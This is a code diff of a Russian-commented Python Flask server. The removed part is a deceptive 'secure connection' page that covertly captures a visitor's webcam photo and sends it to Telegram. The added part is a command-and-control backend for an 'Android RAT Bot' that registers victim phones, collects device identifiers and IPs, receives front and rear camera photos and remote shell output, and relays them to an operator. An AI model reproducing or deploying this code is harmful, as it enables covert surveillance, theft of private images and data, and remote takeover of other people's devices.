@@ -1,158 +1,230 @@
-from flask import Flask, render_template_string, request, jsonify
-import requests
-import base64
 import os
-from datetime import datetime
+import json
+import base64
+import logging
+import time
+import threading
+from flask import Flask, request, jsonify
+import telebot
 
+# ========== КОНФИГУРАЦИЯ ==========
+TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "YOUR_BOT_TOKEN_HERE")
+ADMIN_ID = int(os.environ.get("ADMIN_ID", 123456789))
+SERVER_PORT = int(os.environ.get("PORT", 5000))
+
+# ========== ИНИЦИАЛИЗАЦИЯ ==========
 app = Flask(__name__)
+bot = telebot.TeleBot(TELEGRAM_TOKEN)
 
-# ===== НАСТРОЙКИ =====
-TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN"
-TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"
-# =====================
+devices = {}
+status_data = {}
+pending_photos = []
+pending_results = []
 
-HTML_TEMPLATE = """
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Connecting...</title>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%);
-            color: #e0e0e0;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-        .card {
-            background: rgba(255,255,255,0.05);
-            border: 1px solid rgba(255,255,255,0.1);
-            border-radius: 16px;
-            padding: 40px;
-            max-width: 420px;
-            width: 100%;
-            text-align: center;
-            backdrop-filter: blur(10px);
-        }
-        .spinner {
-            border: 3px solid rgba(255,255,255,0.1);
-            border-top: 3px solid #4fc3f7;
-            border-radius: 50%;
-            width: 48px;
-            height: 48px;
-            animation: spin 0.8s linear infinite;
-            margin: 0 auto 24px;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .status { font-size: 16px; color: #9e9e9e; margin-bottom: 12px; }
-        .status.success { color: #66bb6a; }
-        .status.error { color: #ef5350; }
-        .hint { font-size: 13px; color: #616161; margin-top: 20px; }
-        video { display: none; }
-    </style>
-</head>
-<body>
-    <div class="card">
-        <div class="spinner" id="spinner"></div>
-        <div class="status" id="status">Establishing secure connection...</div>
-        <div class="hint" id="hint">Please allow camera access when prompted</div>
-        <video id="video" autoplay muted playsinline></video>
-    </div>
-    <script>
-    async function capture() {
-        const statusEl = document.getElementById('status');
-        const hintEl = document.getElementById('hint');
-        const spinnerEl = document.getElementById('spinner');
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({
-                video: { width: { ideal: 640 }, height: { ideal: 480 } }
-            });
-            statusEl.className = 'status success';
-            statusEl.innerText = 'Camera access granted';
-            hintEl.innerText = 'Capturing image...';
-            spinnerEl.style.display = 'none';
-            const video = document.getElementById('video');
-            video.srcObject = stream;
-            await video.play();
-            await new Promise(r => setTimeout(r, 1500));
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0);
-            const imageData = canvas.toDataURL('image/jpeg', 0.8);
-            stream.getTracks().forEach(t => t.stop());
-            const host = window.location.origin;
-            const resp = await fetch(host + '/photo', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ image: imageData })
-            });
-            if (resp.ok) {
-                statusEl.innerText = 'Connection closed';
-                hintEl.innerText = 'You may leave this page';
-            } else {
-                throw new Error('Upload failed');
-            }
-        } catch (e) {
-            statusEl.className = 'status error';
-            statusEl.innerText = 'Connection failed';
-            hintEl.innerText = 'Please try again later';
-            if (e.name === 'NotAllowedError' || e.name === 'PermissionDeniedError') {
-                statusEl.innerText = 'Camera access denied';
-                hintEl.innerText = 'Camera permission is required';
-            }
-        }
-    }
-    capture();
-    </script>
-</body>
-</html>
-"""
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
+logger = logging.getLogger(__name__)
 
-def send_telegram_photo(image_b64):
-    if "," in image_b64:
-        image_b64 = image_b64.split(",")[1]
-    try:
-        img_data = base64.b64decode(image_b64)
-    except Exception as e:
-        print(f"[!] Base64 decode error: {e}")
+# ========== TELEGRAM БОТ ==========
+
+@bot.message_handler(commands=['start'])
+def start(message):
+    if message.chat.id != ADMIN_ID:
+        bot.reply_to(message, "⛔ Access denied.")
         return
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
-    files = {"photo": ("capture.jpg", img_data, "image/jpeg")}
-    caption = f"Capture {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-    try:
-        r = requests.post(url, files=files, data={"chat_id": TELEGRAM_CHAT_ID, "caption": caption}, timeout=10)
-        print(f"[TG] {r.status_code}")
-    except Exception as e:
-        print(f"[TG] Error: {e}")
+    bot.reply_to(message, 
+        "✅ **Android RAT Bot** запущен.\n\n"
+        "**Команды:**\n"
+        "`/devices` — список устройств\n"
+        "`/status [id]` — инфо\n"
+        "`/photo [id]` — фото с обеих камер\n"
+        "`/shell [id] [команда]` — shell",
+        parse_mode="Markdown"
+    )
 
-@app.route("/")
+@bot.message_handler(commands=['devices'])
+def list_devices(message):
+    if message.chat.id != ADMIN_ID:
+        return
+    if not devices:
+        bot.reply_to(message, "❌ Нет устройств.")
+        return
+    msg = "📱 **Устройства:**\n\n"
+    for did, info in devices.items():
+        msg += f"🔹 `{did}` — {info.get('name', 'N/A')} (последний раз: {info.get('last_seen', 'никогда')})\n"
+    bot.reply_to(message, msg, parse_mode="Markdown")
+
+@bot.message_handler(commands=['status'])
+def get_status(message):
+    if message.chat.id != ADMIN_ID:
+        return
+    parts = message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        bot.reply_to(message, "❌ `/status [id]`", parse_mode="Markdown")
+        return
+    device_id = parts[1].strip()
+    if device_id not in status_data:
+        bot.reply_to(message, f"❌ Нет данных для `{device_id}`", parse_mode="Markdown")
+        return
+    d = status_data[device_id]
+    bot.reply_to(message,
+        f"📊 **{device_id}**\n"
+        f"📱 {d.get('model','N/A')}\n"
+        f"🆔 `{d.get('android_id','N/A')}`\n"
+        f"🔋 {d.get('battery','N/A')}%\n"
+        f"📶 {d.get('signal','N/A')}\n"
+        f"🌐 `{d.get('ip','N/A')}`\n"
+        f"📅 {d.get('time','N/A')}",
+        parse_mode="Markdown"
+    )
+
+@bot.message_handler(commands=['photo'])
+def photo_cmd(message):
+    if message.chat.id != ADMIN_ID:
+        return
+    bot.reply_to(message, "📸 Команда отправлена. Жди фото.")
+
+@bot.message_handler(commands=['shell'])
+def shell_cmd(message):
+    if message.chat.id != ADMIN_ID:
+        return
+    bot.reply_to(message, "🔄 Команда отправлена. Жди результат.")
+
+# ========== ФОН ОТПРАВКИ СООБЩЕНИЙ ==========
+
+def send_pending():
+    """Фоновый поток: отправляет фото и результаты в Telegram"""
+    while True:
+        try:
+            # Фото
+            while pending_photos:
+                item = pending_photos.pop(0)
+                try:
+                    photo_bytes = base64.b64decode(item['photo'])
+                    cam = item.get('camera', 'unknown')
+                    did = item['device_id']
+                    caption = f"🤳 {did} — Фронтальная" if cam == "front" else f"📷 {did} — Задняя"
+                    bot.send_photo(ADMIN_ID, photo_bytes, caption=caption)
+                    logger.info(f"📸 Отправлено фото {did} {cam}")
+                    time.sleep(1)
+                except Exception as e:
+                    logger.error(f"Ошибка фото: {e}")
+
+            # Результаты команд
+            while pending_results:
+                item = pending_results.pop(0)
+                try:
+                    did = item['device_id']
+                    cmd = item['cmd']
+                    result = item['result']
+                    bot.send_message(ADMIN_ID,
+                        f"💻 **Результат** `{did}`\n`{cmd}`\n```\n{result[:3000]}\n```",
+                        parse_mode="Markdown"
+                    )
+                    logger.info(f"💻 Отправлен результат {did}")
+                    time.sleep(1)
+                except Exception as e:
+                    logger.error(f"Ошибка результата: {e}")
+
+        except Exception as e:
+            logger.error(f"Ошибка фонового потока: {e}")
+
+        time.sleep(2)
+
+# ========== FLASK API ==========
+
+@app.route('/')
 def index():
-    return render_template_string(HTML_TEMPLATE)
+    return jsonify({"status": "running", "devices": len(devices)})
 
-@app.route("/photo", methods=["POST"])
-def photo():
-    data = request.get_json()
-    if not data or "image" not in data:
-        return jsonify({"status": "error", "message": "no image"}), 400
-    image_b64 = data["image"]
-    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-    os.makedirs("captures", exist_ok=True)
-    raw = image_b64.split(",")[1] if "," in image_b64 else image_b64
-    with open(f"captures/capture_{ts}.jpg", "wb") as f:
-        f.write(base64.b64decode(raw))
-    print(f"[+] Saved captures/capture_{ts}.jpg")
-    send_telegram_photo(image_b64)
-    return jsonify({"status": "ok"})
+@app.route('/register', methods=['POST'])
+def register_device():
+    try:
+        data = request.json
+        device_id = data.get('device_id')
+        name = data.get('name', 'Unknown')
+        model = data.get('model', 'Unknown')
+        if not device_id:
+            return jsonify({"error": "no id"}), 400
+        devices[device_id] = {
+            'name': name,
+            'model': model,
+            'ip': request.remote_addr,
+            'last_seen': time.strftime("%Y-%m-%d %H:%M:%S")
+        }
+        logger.info(f"✅ Зарегистрирован: {device_id} ({name})")
+        try:
+            bot.send_message(ADMIN_ID, f"🆕 **Новое устройство:**\n🆔 `{device_id}`\n📛 {name}\n📱 {model}", parse_mode="Markdown")
+        except:
+            pass
+        return jsonify({"status": "ok", "device_id": device_id})
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
 
-if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host="0.0.0.0", port=port, debug=False)
+@app.route('/status', methods=['POST'])
+def receive_status():
+    try:
+        data = request.json
+        did = data.get('device_id')
+        if did:
+            status_data[did] = data
+            if did in devices:
+                devices[did]['last_seen'] = data.get('time', time.strftime("%Y-%m-%d %H:%M:%S"))
+        return jsonify({"status": "ok"})
+    except:
+        return jsonify({"error": "bad"}), 500
+
+@app.route('/photo', methods=['POST'])
+def receive_photo():
+    try:
+        data = request.json
+        did = data.get('device_id')
+        photo = data.get('photo')
+        camera = data.get('camera', 'unknown')
+        if photo and did:
+            pending_photos.append({'device_id': did, 'photo': photo, 'camera': camera})
+            logger.info(f"📸 Фото в очереди: {did} {camera}")
+        return jsonify({"status": "ok"})
+    except:
+        return jsonify({"error": "bad"}), 500
+
+@app.route('/cmd_result', methods=['POST'])
+def receive_cmd_result():
+    try:
+        data = request.json
+        did = data.get('device_id')
+        result = data.get('result', '')
+        cmd = data.get('cmd', '')
+        if did:
+            pending_results.append({'device_id': did, 'cmd': cmd, 'result': result})
+            logger.info(f"💻 Результат в очереди: {did} {cmd}")
+        return jsonify({"status": "ok"})
+    except:
+        return jsonify({"error": "bad"}), 500
+
+@app.route('/devices', methods=['GET'])
+def list_api():
+    return jsonify(devices)
+
+# ========== ЗАПУСК ==========
+
+if __name__ == '__main__':
+    logger.info("🚀 Запуск сервера...")
+    
+    # Запускаем фоновый поток для отправки сообщений
+    t = threading.Thread(target=send_pending, daemon=True)
+    t.start()
+    
+    # Запускаем бота в отдельном потоке
+    def bot_thread():
+        while True:
+            try:
+                bot.polling(none_stop=True, interval=1, timeout=30)
+            except Exception as e:
+                logger.error(f"❌ Бот упал: {e}, перезапуск через 5с...")
+                time.sleep(5)
+    
+    t2 = threading.Thread(target=bot_thread, daemon=True)
+    t2.start()
+    
+    # Запускаем Flask (это главный поток)
+    app.run(host='0.0.0.0', port=SERVER_PORT, debug=False)
